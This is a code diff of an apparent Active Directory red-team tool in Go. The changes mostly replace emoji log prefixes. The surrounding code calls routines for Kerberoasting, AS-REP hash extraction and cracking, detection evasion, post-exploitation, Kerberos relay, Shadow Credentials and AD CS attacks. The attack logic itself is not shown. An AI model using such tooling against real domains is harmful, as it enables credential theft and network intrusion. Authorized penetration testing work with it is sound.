@@ -199,27 +199,27 @@ func runHunt() {
 			"WARNING: Only use this feature on systems you own or have written permission to test.")
 	}
 
-	log.Printf("🔍 Starting Kerberos enumeration against %s", *target)
+	log.Printf("[*] Starting Kerberos enumeration against %s", *target)
 
 	// Connect to LDAP
 	client, err := krb.ConnectLDAP(*target, *bindUser, *bindPass, *useSSL)
 	if err != nil {
-		log.Fatalf("❌ Failed to connect to target: %v\n🔧 Try: kerb-sleuth %s --user <username> --pass <password>", err, *target)
+		log.Fatalf(" Failed to connect to target: %v\n🔧 Try: kerb-sleuth %s --user <username> --pass <password>", err, *target)
 	}
 	defer client.Close()
 
 	// Enumerate users
 	users, err := client.EnumerateUsers()
 	if err != nil {
-		log.Fatalf("❌ Failed to enumerate users: %v", err)
+		log.Fatalf("[x] Failed to enumerate users: %v", err)
 	}
 
-	log.Printf("✅ Found %d users via LDAP", len(users))
+	log.Printf("[+] Found %d users via LDAP", len(users))
 
 	// Load configuration
 	cfg, err := loadConfig(*configFile)
 	if err != nil {
-		log.Printf("⚠️  Warning: Could not load config file: %v. Using defaults.", err)
+		log.Printf("[!] Warning: Could not load config file: %v. Using defaults.", err)
 		cfg = triage.DefaultConfig()
 	}
 
@@ -239,7 +239,7 @@ func runAnalyze() {
 		log.Fatal("AD file is required. Usage: kerb-sleuth analyze --ad <file>")
 	}
 
-	log.Printf("📂 Parsing AD data from %s", *adFile)
+	log.Printf("[*] Parsing AD data from %s", *adFile)
 
 	users, err := ingest.ParseAD(*adFile)
 	if err != nil {
@@ -250,7 +250,7 @@ func runAnalyze() {
 
 	cfg, err := loadConfig(*configFile)
 	if err != nil {
-		log.Printf("⚠️  Warning: Could not load config file: %v. Using defaults.", err)
+		log.Printf("[!]  Warning: Could not load config file: %v. Using defaults.", err)
 		cfg = triage.DefaultConfig()
 	}
 
@@ -258,14 +258,14 @@ func runAnalyze() {
 }
 
 func performKerberosAnalysis(users []ingest.User, cfg *triage.Config) {
-	log.Printf("🔍 Starting Kerberos security analysis...")
+	log.Printf("[*] Starting Kerberos security analysis...")
 
 	// Find AS-REP and Kerberoast candidates
 	asrepCandidates := krb.FindASREPCandidates(users)
 	kerberoastCandidates := krb.FindKerberoastCandidates(users)
 
-	log.Printf("📋 Found %d AS-REP candidates", len(asrepCandidates))
-	log.Printf("📋 Found %d Kerberoast candidates", len(kerberoastCandidates))
+	log.Printf("[+] Found %d AS-REP candidates", len(asrepCandidates))
+	log.Printf("[+] Found %d Kerberoast candidates", len(kerberoastCandidates))
 
 	// Score candidates
 	allCandidates := triage.ScoreCandidates(asrepCandidates, kerberoastCandidates, cfg)
@@ -281,11 +281,11 @@ func performKerberosAnalysis(users []ingest.User, cfg *triage.Config) {
 
 	// Export hashes if cracking is enabled
 	if *crack && *authorized {
-		log.Printf("🔑 Extracting hashes for authorized testing...")
+		log.Printf("[*] Extracting hashes for authorized testing...")
 
 		// Extract actual hashes for candidates
 		if err := extractAndCrackHashes(allCandidates, *wordlist); err != nil {
-			log.Printf("⚠️  Hash extraction/cracking failed: %v", err)
+			log.Printf(" [x] Hash extraction/cracking failed: %v", err)
 		}
 	}
 
@@ -297,18 +297,18 @@ func performKerberosAnalysis(users []ingest.User, cfg *triage.Config) {
 	if *csvOutput {
 		csvFile := strings.TrimSuffix(*outFile, ".json") + ".csv"
 		if err := output.WriteCSV(csvFile, results); err != nil {
-			log.Printf("Warning: Failed to save CSV: %v", err)
+			log.Printf(" [!] Warning: Failed to save CSV: %v", err)
 		} else {
-			log.Printf("📊 CSV summary saved to %s", csvFile)
+			log.Printf("[+] CSV summary saved to %s", csvFile)
 		}
 	}
 
 	if *siemOutput {
 		sigmaFile := strings.TrimSuffix(*outFile, ".json") + "_sigma.yml"
 		if err := output.WriteSigmaRules(sigmaFile, results); err != nil {
-			log.Printf("Warning: Failed to save Sigma rules: %v", err)
+			log.Printf(" [!] Warning: Failed to save Sigma rules: %v", err)
 		} else {
-			log.Printf("🔍 Sigma rules saved to %s", sigmaFile)
+			log.Printf("[+] Sigma rules saved to %s", sigmaFile)
 		}
 	}
 
@@ -327,18 +327,18 @@ func performKerberosAnalysis(users []ingest.User, cfg *triage.Config) {
 		}
 	}
 
-	log.Printf("\n🎯 Analysis complete: %d candidates (%d high, %d medium, %d low)",
+	log.Printf("\n[+] Analysis complete: %d candidates (%d high, %d medium, %d low)",
 		len(allCandidates), highRisk, mediumRisk, lowRisk)
 
 	if highRisk > 0 {
-		log.Printf("🚨 %d HIGH RISK targets found! Check %s for details", highRisk, *outFile)
+		log.Printf("[+] %d HIGH RISK targets found! Check %s for details", highRisk, *outFile)
 	}
 
-	log.Printf("📄 Full report saved to %s", *outFile)
+	log.Printf("[+] Full report saved to %s", *outFile)
 }
 
 func runAdvancedAnalysis(client *krb.LDAPClient, cfg *triage.Config) {
-	log.Printf("🚀 Starting advanced Kerberos analysis...")
+	log.Printf("[*] Starting advanced Kerberos analysis...")
 
 	// Safety check for dangerous operations
 	if *dangerousMode && !*authorized {
@@ -352,87 +352,87 @@ func runAdvancedAnalysis(client *krb.LDAPClient, cfg *triage.Config) {
 
 	// Run specific advanced analyses based on flags
 	if *advancedMode {
-		log.Printf("🔍 Running full advanced analysis...")
+		log.Printf("[*] Running full advanced analysis...")
 		if err := analyzer.RunFullAnalysis(); err != nil {
-			log.Printf("⚠️  Full advanced analysis failed: %v", err)
+			log.Printf("[x] Full advanced analysis failed: %v", err)
 		}
 	} else {
 		// Run individual analyses
 		if *timeroasting {
-			log.Printf("🔍 Running timeroasting analysis...")
+			log.Printf("[*] Running timeroasting analysis...")
 			var spns []string
 			if err := analyzer.RunTimeroastingAnalysis(*kirbiPath, spns); err != nil {
-				log.Printf("⚠️  Timeroasting analysis failed: %v", err)
+				log.Printf("[x] Timeroasting analysis failed: %v", err)
 			}
 		}
 
 		if *rbcdAnalysis {
-			log.Printf("🔍 Running RBCD analysis...")
+			log.Printf("[*] Running RBCD analysis...")
 			if err := analyzer.RunRBCDAnalysis(); err != nil {
-				log.Printf("⚠️  RBCD analysis failed: %v", err)
+				log.Printf("[x] RBCD analysis failed: %v", err)
 			}
 		}
 
 		if *s4uAnalysis {
-			log.Printf("🔍 Running S4U analysis...")
+			log.Printf("[*] Running S4U analysis...")
 			if err := analyzer.RunS4UAnalysis(); err != nil {
-				log.Printf("⚠️  S4U analysis failed: %v", err)
+				log.Printf("[x] S4U analysis failed: %v", err)
 			}
 		}
 
 		if *overpassAnalysis {
-			log.Printf("🔍 Running Overpass-the-Hash analysis...")
+			log.Printf("[*] Running Overpass-the-Hash analysis...")
 			hashes := parseNTLMHashes(*ntlmHashes)
 			if err := analyzer.RunOverpassAnalysis(hashes); err != nil {
-				log.Printf("⚠️  Overpass analysis failed: %v", err)
+				log.Printf("[x] Overpass analysis failed: %v", err)
 			}
 		}
 
 		if *ticketAnalysis {
-			log.Printf("🔍 Running Silver/Golden ticket analysis...")
+			log.Printf("[*] Running Silver/Golden ticket analysis...")
 			ticketBytes := []byte(*ticketData)
 			if err := analyzer.RunTicketAnalysis(ticketBytes, "Unknown"); err != nil {
-				log.Printf("⚠️  Ticket analysis failed: %v", err)
+				log.Printf("[x] Ticket analysis failed: %v", err)
 			}
 		}
 
 		if *pkinitAnalysis {
-			log.Printf("🔍 Running PKINIT/AD CS analysis...")
+			log.Printf("[*] Running PKINIT/AD CS analysis...")
 			if err := analyzer.RunPKINITAnalysis(); err != nil {
-				log.Printf("⚠️  PKINIT analysis failed: %v", err)
+				log.Printf("[x] PKINIT analysis failed: %v", err)
 			}
 		}
 
 		if *dcsyncAnalysis {
-			log.Printf("🔍 Running DCSync analysis...")
+			log.Printf("[*] Running DCSync analysis...")
 			if err := analyzer.RunDCSyncAnalysis(); err != nil {
-				log.Printf("⚠️  DCSync analysis failed: %v", err)
+				log.Printf("[x] DCSync analysis failed: %v", err)
 			}
 		}
 
 		if *lifetimeAnalysis {
-			log.Printf("🔍 Running ticket lifetime analysis...")
+			log.Printf("[*] Running ticket lifetime analysis...")
 			// This would typically come from ticket data
 			ticketData := []map[string]interface{}{}
 			if err := analyzer.RunTicketLifetimeAnalysis(ticketData); err != nil {
-				log.Printf("⚠️  Lifetime analysis failed: %v", err)
+				log.Printf("[x] Lifetime analysis failed: %v", err)
 			}
 		}
 
 		if *loggingAnalysis {
-			log.Printf("🔍 Running logging and detection analysis...")
+			log.Printf("[*] Running logging and detection analysis...")
 			if err := analyzer.RunLoggingAnalysis(); err != nil {
-				log.Printf("⚠️  Logging analysis failed: %v", err)
+				log.Printf("[x] Logging analysis failed: %v", err)
 			}
 		}
 
 		if *passwordAnalysis {
-			log.Printf("🔍 Running password modification analysis...")
+			log.Printf("[*] Running password modification analysis...")
 			if *targetAccount == "" {
-				log.Printf("⚠️  Password analysis requires --account parameter")
+				log.Printf("[!] Password analysis requires --account parameter")
 			} else {
 				if err := analyzer.RunPasswordModificationAnalysis(*targetAccount); err != nil {
-					log.Printf("⚠️  Password analysis failed: %v", err)
+					log.Printf("[x] Password analysis failed: %v", err)
 				}
 			}
 		}
@@ -440,110 +440,110 @@ func runAdvancedAnalysis(client *krb.LDAPClient, cfg *triage.Config) {
 
 	// DEADLY FEATURES - Only run if authorized
 	if *authorized {
-		log.Printf("🔥 Starting DEADLY features execution...")
+		log.Printf(" [XXX] Activating KILL MODE...")
 
 		// Real Kerberos Protocol
 		if *realKerberos {
-			log.Printf("🔥 Using real Kerberos protocol...")
+			log.Printf("[*] Using real Kerberos protocol...")
 			if err := runRealKerberosProtocol(client); err != nil {
-				log.Printf("⚠️  Real Kerberos protocol failed: %v", err)
+				log.Printf("[x] Real Kerberos protocol failed: %v", err)
 			}
 		}
 
 		// BloodHound Integration
 		if *bloodhoundExport {
-			log.Printf("🔥 Exporting to BloodHound...")
+			log.Printf("[*] Exporting to BloodHound...")
 			if err := runBloodHoundExport(client); err != nil {
-				log.Printf("⚠️  BloodHound export failed: %v", err)
+				log.Printf("[x] BloodHound export failed: %v", err)
 			}
 		}
 
 		// Stealth Mode
 		if *stealthMode {
-			log.Printf("🔥 Enabling stealth mode...")
+			log.Printf("[*] Enabling stealth mode...")
 			if err := runStealthMode(); err != nil {
-				log.Printf("⚠️  Stealth mode failed: %v", err)
+				log.Printf("[x] Stealth mode failed: %v", err)
 			}
 		}
 
 		// Post-Exploitation
 		if *postExploit {
-			log.Printf("🔥 Starting post-exploitation chain...")
+			log.Printf("[*] Starting post-exploitation chain...")
 			if err := runPostExploitation(client); err != nil {
-				log.Printf("⚠️  Post-exploitation failed: %v", err)
+				log.Printf("[x] Post-exploitation failed: %v", err)
 			}
 		}
 
 		// Detection Evasion
 		if *detectionEvasion {
-			log.Printf("🔥 Starting detection evasion...")
+			log.Printf("[*] Starting detection evasion...")
 			if err := runDetectionEvasion(); err != nil {
-				log.Printf("⚠️  Detection evasion failed: %v", err)
+				log.Printf("[x] Detection evasion failed: %v", err)
 			}
 		}
 
 		// Kerberos Relay
 		if *kerberosRelay {
-			log.Printf("🔥 Starting Kerberos relay attacks...")
+			log.Printf("[*] Starting Kerberos relay attacks...")
 			if err := runKerberosRelay(client); err != nil {
-				log.Printf("⚠️  Kerberos relay failed: %v", err)
+				log.Printf("[x] Kerberos relay failed: %v", err)
 			}
 		}
 
 		// Shadow Credentials
 		if *shadowCreds {
-			log.Printf("🔥 Starting Shadow Credentials attacks...")
+			log.Printf("[*] Starting Shadow Credentials attacks...")
 			if err := runShadowCredentials(client); err != nil {
-				log.Printf("⚠️  Shadow Credentials failed: %v", err)
+				log.Printf("[x] Shadow Credentials failed: %v", err)
 			}
 		}
 
 		// AD CS Attacks
 		if *adcsAttacks {
-			log.Printf("🔥 Starting AD CS attacks...")
+			log.Printf("[*] Starting AD CS attacks...")
 			if err := runADCSAttacks(client); err != nil {
-				log.Printf("⚠️  AD CS attacks failed: %v", err)
+				log.Printf("[x] AD CS attacks failed: %v", err)
 			}
 		}
 
 		// Exploit Chain
 		if *exploitChain {
-			log.Printf("🔥 Starting exploit chain...")
+			log.Printf("[*] Starting exploit chain...")
 			if err := runExploitChain(client); err != nil {
-				log.Printf("⚠️  Exploit chain failed: %v", err)
+				log.Printf("[x] Exploit chain failed: %v", err)
 			}
 		}
 
 		// AI Analysis
 		if *aiAnalysis {
-			log.Printf("🔥 Starting AI-powered analysis...")
+			log.Printf("[*] Starting AI-powered analysis...")
 			if err := runAIAnalysis(client); err != nil {
-				log.Printf("⚠️  AI analysis failed: %v", err)
+				log.Printf("[x] AI analysis failed: %v", err)
 			}
 		}
 
 		// Plugin System
 		if *pluginSystem {
-			log.Printf("🔥 Starting plugin system...")
+			log.Printf("[*] Starting plugin system...")
 			if err := runPluginSystem(client); err != nil {
-				log.Printf("⚠️  Plugin system failed: %v", err)
+				log.Printf("[x] Plugin system failed: %v", err)
 			}
 		}
 
 		// Multi-Platform Build
 		if *multiPlatform {
-			log.Printf("🔥 Starting multi-platform build...")
+			log.Printf("[*] Starting multi-platform build...")
 			if err := runMultiPlatformBuild(); err != nil {
-				log.Printf("⚠️  Multi-platform build failed: %v", err)
+				log.Printf("[x] Multi-platform build failed: %v", err)
 			}
 		}
 
-		log.Printf("✅ DEADLY features execution completed")
+		log.Printf("[+] DEADLY features execution completed")
 	} else {
-		log.Printf("⚠️  DEADLY features require --i-am-authorized flag")
+		log.Printf("[!]  DEADLY features require --i-am-authorized flag")
 	}
 
-	log.Printf("✅ Advanced analysis completed. Results saved to %s", outputDir)
+	log.Printf("[+] Advanced analysis completed. Results saved to %s", outputDir)
 }
 
 // parseNTLMHashes parses NTLM hash input string
@@ -574,13 +574,13 @@ func runSimulate() {
 		log.Fatalf("Failed to create output directory: %v", err)
 	}
 
-	log.Printf("🎲 Generating %s dataset in %s", *dataset, outDir)
+	log.Printf("[*] Generating %s dataset in %s", *dataset, outDir)
 
 	if err := generateSampleData(*dataset, outDir); err != nil {
 		log.Fatalf("Failed to generate sample data: %v", err)
 	}
 
-	log.Printf("✅ Sample data generated successfully")
+	log.Printf("[+] Sample data generated successfully")
 }
 
 func loadConfig(path string) (*triage.Config, error) {
@@ -674,7 +674,7 @@ func extractAndCrackHashes(candidates []krb.Candidate, wordlist string) error {
 	var asrepHashes []*krb.HashResult
 	var kerberoastHashes []*krb.HashResult
 
-	log.Printf("🔍 Extracting hashes from %d candidates...", len(candidates))
+	log.Printf("[*] Extracting hashes from %d candidates...", len(candidates))
 
 	// Extract hashes for each candidate
 	for _, candidate := range candidates {
@@ -683,7 +683,7 @@ func extractAndCrackHashes(candidates []krb.Candidate, wordlist string) error {
 			log.Printf("🎯 Extracting AS-REP hash for %s", candidate.SamAccountName)
 			hash, err := client.ExtractASREPHash(candidate.SamAccountName, domainInfo.DomainName)
 			if err != nil {
-				log.Printf("⚠️  Failed to extract AS-REP hash for %s: %v", candidate.SamAccountName, err)
+				log.Printf("[x] Failed to extract AS-REP hash for %s: %v", candidate.SamAccountName, err)
 				continue
 			}
 			asrepHashes = append(asrepHashes, hash)
@@ -693,7 +693,7 @@ func extractAndCrackHashes(candidates []krb.Candidate, wordlist string) error {
 				log.Printf("🎯 Extracting Kerberoast hash for %s (SPN: %s)", candidate.SamAccountName, spn)
 				hash, err := client.ExtractKerberoastHash(candidate.SamAccountName, domainInfo.DomainName, spn)
 				if err != nil {
-					log.Printf("⚠️  Failed to extract Kerberoast hash for %s: %v", candidate.SamAccountName, err)
+					log.Printf("[x] Failed to extract Kerberoast hash for %s: %v", candidate.SamAccountName, err)
 					continue
 				}
 				kerberoastHashes = append(kerberoastHashes, hash)
@@ -724,7 +724,7 @@ func exportHashesToFiles(asrepHashes, kerberoastHashes []*krb.HashResult) error 
 		if err := writeHashFile(asrepFile, asrepHashes, "AS-REP Roasting"); err != nil {
 			return fmt.Errorf("failed to write AS-REP hashes: %v", err)
 		}
-		log.Printf("📄 Exported %d AS-REP hashes to %s", len(asrepHashes), asrepFile)
+		log.Printf("[+] Exported %d AS-REP hashes to %s", len(asrepHashes), asrepFile)
 	}
 
 	// Export Kerberoast hashes
@@ -733,14 +733,14 @@ func exportHashesToFiles(asrepHashes, kerberoastHashes []*krb.HashResult) error 
 		if err := writeHashFile(kerberoastFile, kerberoastHashes, "Kerberoasting"); err != nil {
 			return fmt.Errorf("failed to write Kerberoast hashes: %v", err)
 		}
-		log.Printf("📄 Exported %d Kerberoast hashes to %s", len(kerberoastHashes), kerberoastFile)
+		log.Printf("[+] Exported %d Kerberoast hashes to %s", len(kerberoastHashes), kerberoastFile)
 	}
 
 	// Write cracking instructions
 	if len(asrepHashes) > 0 || len(kerberoastHashes) > 0 {
 		readmePath := filepath.Join(hashDir, "CRACKING_GUIDE.txt")
 		if err := writeCrackingGuide(readmePath, len(asrepHashes), len(kerberoastHashes)); err != nil {
-			log.Printf("⚠️  Failed to write cracking guide: %v", err)
+			log.Printf("[x] Failed to write cracking guide: %v", err)
 		}
 	}
 
@@ -777,15 +777,15 @@ func runHashCracking(asrepHashes, kerberoastHashes []*krb.HashResult, wordlist s
 	// Crack AS-REP hashes
 	if len(asrepHashes) > 0 {
 		asrepFile := filepath.Join(hashDir, "asrep_hashes.txt")
-		log.Printf("🔨 Starting AS-REP hash cracking...")
+		log.Printf("[*] Starting AS-REP hash cracking...")
 
 		results, err := cracker.CrackASREP(asrepFile, wordlist)
 		if err != nil {
-			log.Printf("⚠️  AS-REP cracking failed: %v", err)
+			log.Printf("[x] AS-REP cracking failed: %v", err)
 		} else {
-			log.Printf("✅ AS-REP cracking completed with %d results", len(results))
+			log.Printf("[+] AS-REP cracking completed with %d results", len(results))
 			for hash, password := range results {
-				log.Printf("   🎉 CRACKED: %s... => %s", hash[:20], password)
+				log.Printf("[+] CRACKED: %s... => %s", hash[:20], password)
 			}
 		}
 	}
@@ -793,15 +793,15 @@ func runHashCracking(asrepHashes, kerberoastHashes []*krb.HashResult, wordlist s
 	// Crack Kerberoast hashes
 	if len(kerberoastHashes) > 0 {
 		kerberoastFile := filepath.Join(hashDir, "kerberoast_hashes.txt")
-		log.Printf("🔨 Starting Kerberoast hash cracking...")
+		log.Printf("[*] Starting Kerberoast hash cracking...")
 
 		results, err := cracker.CrackKerberoast(kerberoastFile, wordlist)
 		if err != nil {
-			log.Printf("⚠️  Kerberoast cracking failed: %v", err)
+			log.Printf("[x] Kerberoast cracking failed: %v", err)
 		} else {
-			log.Printf("✅ Kerberoast cracking completed with %d results", len(results))
+			log.Printf("[+] Kerberoast cracking completed with %d results", len(results))
 			for hash, password := range results {
-				log.Printf("   🎉 CRACKED: %s... => %s", hash[:20], password)
+				log.Printf("[+] CRACKED: %s... => %s", hash[:20], password)
 			}
 		}
 	}
@@ -850,7 +850,7 @@ func writeCrackingGuide(filePath string, asrepCount, kerberoastCount int) error 
 
 // runRealKerberosProtocol implements real Kerberos protocol
 func runRealKerberosProtocol(client *krb.LDAPClient) error {
-	log.Printf("🔥 Implementing real Kerberos protocol...")
+	log.Printf("[*] Implementing real Kerberos protocol...")
 
 	// Create Kerberos client
 	kerbClient, err := kerberos.NewKerberosClient(*target, *target)
@@ -870,13 +870,13 @@ func runRealKerberosProtocol(client *krb.LDAPClient) error {
 		return fmt.Errorf("TGT request failed: %v", err)
 	}
 
-	log.Printf("✅ Real Kerberos protocol implemented successfully")
+	log.Printf("[+] Real Kerberos protocol implemented successfully")
 	return nil
 }
 
 // runBloodHoundExport exports results to BloodHound format
 func runBloodHoundExport(client *krb.LDAPClient) error {
-	log.Printf("🔥 Exporting to BloodHound format...")
+	log.Printf("[*] Exporting to BloodHound format...")
 
 	// Get domain from client
 	domain := "corp.local" // This should be extracted from client
@@ -907,13 +907,13 @@ func runBloodHoundExport(client *krb.LDAPClient) error {
 		return fmt.Errorf("failed to export BloodHound data: %v", err)
 	}
 
-	log.Printf("✅ BloodHound export completed: %s", outputFile)
+	log.Printf("[+] BloodHound export completed: %s", outputFile)
 	return nil
 }
 
 // runStealthMode implements stealth mode
 func runStealthMode() error {
-	log.Printf("🔥 Implementing stealth mode...")
+	log.Printf("[*] Implementing stealth mode...")
 
 	// Create stealth configuration
 	config := stealth.DefaultStealthConfig()
@@ -931,13 +931,13 @@ func runStealthMode() error {
 	stealthClient.AntiDetectionTechniques()
 	stealthClient.ApplyStealthDelay()
 
-	log.Printf("✅ Stealth mode implemented successfully")
+	log.Printf("[+] Stealth mode implemented successfully")
 	return nil
 }
 
 // runPostExploitation implements post-exploitation automation
 func runPostExploitation(client *krb.LDAPClient) error {
-	log.Printf("🔥 Starting post-exploitation automation...")
+	log.Printf("[*] Starting post-exploitation automation...")
 
 	// Get current user and host
 	currentUser := "current_user"
@@ -966,13 +966,13 @@ func runPostExploitation(client *krb.LDAPClient) error {
 		return fmt.Errorf("post-exploitation chain failed: %v", err)
 	}
 
-	log.Printf("✅ Post-exploitation automation completed")
+	log.Printf("[+] Post-exploitation automation completed")
 	return nil
 }
 
 // runDetectionEvasion implements detection evasion
 func runDetectionEvasion() error {
-	log.Printf("🔥 Starting detection evasion...")
+	log.Printf("[*] Starting detection evasion...")
 
 	// Create evasion configuration
 	config := evasion.DefaultEvasionConfig()
@@ -989,13 +989,13 @@ func runDetectionEvasion() error {
 		return fmt.Errorf("evasion chain failed: %v", err)
 	}
 
-	log.Printf("✅ Detection evasion completed")
+	log.Printf("[+] Detection evasion completed")
 	return nil
 }
 
 // runKerberosRelay implements Kerberos relay attacks
 func runKerberosRelay(client *krb.LDAPClient) error {
-	log.Printf("🔥 Starting Kerberos relay attacks...")
+	log.Printf("[*] Starting Kerberos relay attacks...")
 
 	// Create relay engine
 	domain := "corp.local"
@@ -1013,13 +1013,13 @@ func runKerberosRelay(client *krb.LDAPClient) error {
 	// Stop relay server
 	relayEngine.StopRelayServer()
 
-	log.Printf("✅ Kerberos relay attacks completed")
+	log.Printf("[+] Kerberos relay attacks completed")
 	return nil
 }
 
 // runShadowCredentials implements Shadow Credentials attacks
 func runShadowCredentials(client *krb.LDAPClient) error {
-	log.Printf("🔥 Starting Shadow Credentials attacks...")
+	log.Printf("[*] Starting Shadow Credentials attacks...")
 
 	// Create Shadow Credentials engine
 	domain := "corp.local"
@@ -1041,13 +1041,13 @@ func runShadowCredentials(client *krb.LDAPClient) error {
 		return fmt.Errorf("failed to authenticate with Shadow Credentials: %v", err)
 	}
 
-	log.Printf("✅ Shadow Credentials attacks completed")
+	log.Printf("[+] Shadow Credentials attacks completed")
 	return nil
 }
 
 // runADCSAttacks implements AD CS attacks
 func runADCSAttacks(client *krb.LDAPClient) error {
-	log.Printf("🔥 Starting AD CS attacks...")
+	log.Printf("[*] Starting AD CS attacks...")
 
 	// Create AD CS attack engine
 	domain := "corp.local"
@@ -1066,17 +1066,17 @@ func runADCSAttacks(client *krb.LDAPClient) error {
 
 	// Execute ESC1 attack
 	if err := adcsEngine.ExecuteESC1Attack("VulnerableTemplate"); err != nil {
-		log.Printf("⚠️  ESC1 attack failed: %v", err)
+		log.Printf("[x] ESC1 attack failed: %v", err)
 	}
 
 	// Execute ESC2 attack
 	if err := adcsEngine.ExecuteESC2Attack("VulnerableTemplate"); err != nil {
-		log.Printf("⚠️  ESC2 attack failed: %v", err)
+		log.Printf("[x] ESC2 attack failed: %v", err)
 	}
 
 	// Execute ESC3 attack
 	if err := adcsEngine.ExecuteESC3Attack("VulnerableTemplate"); err != nil {
-		log.Printf("⚠️  ESC3 attack failed: %v", err)
+		log.Printf("[x] ESC3 attack failed: %v", err)
 	}
 
 	// Generate attack report
@@ -1084,13 +1084,13 @@ func runADCSAttacks(client *krb.LDAPClient) error {
 		return fmt.Errorf("failed to generate attack report: %v", err)
 	}
 
-	log.Printf("✅ AD CS attacks completed")
+	log.Printf("[+] AD CS attacks completed")
 	return nil
 }
 
 // runExploitChain implements exploit chain
 func runExploitChain(client *krb.LDAPClient) error {
-	log.Printf("🔥 Starting exploit chain...")
+	log.Printf("[*] Starting exploit chain...")
 
 	// Create exploit engine
 	domain := "corp.local"
@@ -1123,13 +1123,13 @@ func runExploitChain(client *krb.LDAPClient) error {
 		return fmt.Errorf("failed to generate exploit report: %v", err)
 	}
 
-	log.Printf("✅ Exploit chain completed")
+	log.Printf("[+] Exploit chain completed")
 	return nil
 }
 
 // runAIAnalysis implements AI-powered analysis
 func runAIAnalysis(client *krb.LDAPClient) error {
-	log.Printf("🔥 Starting AI-powered risk analysis...")
+	log.Printf("[*] Starting AI-powered risk analysis...")
 
 	// Get users from LDAP
 	users, err := client.EnumerateUsers()
@@ -1153,7 +1153,7 @@ func runAIAnalysis(client *krb.LDAPClient) error {
 		return fmt.Errorf("failed to analyze risk: %v", err)
 	}
 
-	log.Printf("🤖 AI Risk Analysis Results:")
+	log.Printf("[+] AI Risk Analysis Results:")
 	log.Printf("   Overall Risk Score: %.2f (%s)", riskScore.OverallScore, riskScore.RiskLevel)
 	log.Printf("   Confidence: %.2f", riskScore.Confidence)
 	log.Printf("   Risk Factors: %d", len(riskScore.Factors))
@@ -1165,7 +1165,7 @@ func runAIAnalysis(client *krb.LDAPClient) error {
 		return fmt.Errorf("failed to detect anomalies: %v", err)
 	}
 
-	log.Printf("🔍 Anomaly Detection Results:")
+	log.Printf("[+] Anomaly Detection Results:")
 	log.Printf("   Anomalies Found: %d", len(anomalies.Anomalies))
 	log.Printf("   Detection Confidence: %.2f", anomalies.Confidence)
 
@@ -1178,13 +1178,13 @@ func runAIAnalysis(client *krb.LDAPClient) error {
 		return fmt.Errorf("failed to export anomaly detection: %v", err)
 	}
 
-	log.Printf("✅ AI-powered analysis completed")
+	log.Printf("[+] AI-powered analysis completed")
 	return nil
 }
 
 // runPluginSystem implements plugin system
 func runPluginSystem(client *krb.LDAPClient) error {
-	log.Printf("🔥 Starting plugin system...")
+	log.Printf("[*] Starting plugin system...")
 
 	// Create plugin manager
 	pluginManager := plugins.NewPluginManager("plugins", "plugins/config.json")
@@ -1214,7 +1214,7 @@ func runPluginSystem(client *krb.LDAPClient) error {
 
 	// List loaded plugins
 	pluginList := pluginManager.ListPlugins()
-	log.Printf("🔌 Loaded Plugins: %d", len(pluginList))
+	log.Printf("[+] Loaded Plugins: %d", len(pluginList))
 	for _, plugin := range pluginList {
 		status := "disabled"
 		if plugin.Enabled {
@@ -1228,17 +1228,17 @@ func runPluginSystem(client *krb.LDAPClient) error {
 		return fmt.Errorf("failed to save plugin config: %v", err)
 	}
 
-	log.Printf("✅ Plugin system completed")
+	log.Printf("[+] Plugin system completed")
 	return nil
 }
 
 // runMultiPlatformBuild implements multi-platform build
 func runMultiPlatformBuild() error {
-	log.Printf("🔥 Starting multi-platform build...")
+	log.Printf("[*] Starting multi-platform build...")
 
 	// Get platform info
 	platformInfo := platform.GetPlatformInfo()
-	log.Printf("🔍 Current Platform: %s/%s", platformInfo.OS, platformInfo.Architecture)
+	log.Printf("[+] Current Platform: %s/%s", platformInfo.OS, platformInfo.Architecture)
 
 	// Create cross-platform builder
 	builder := platform.NewCrossPlatformBuilder()
@@ -1253,6 +1253,6 @@ func runMultiPlatformBuild() error {
 		return fmt.Errorf("failed to create install scripts: %v", err)
 	}
 
-	log.Printf("✅ Multi-platform build completed")
+	log.Printf("[+] Multi-platform build completed")
 	return nil
 }
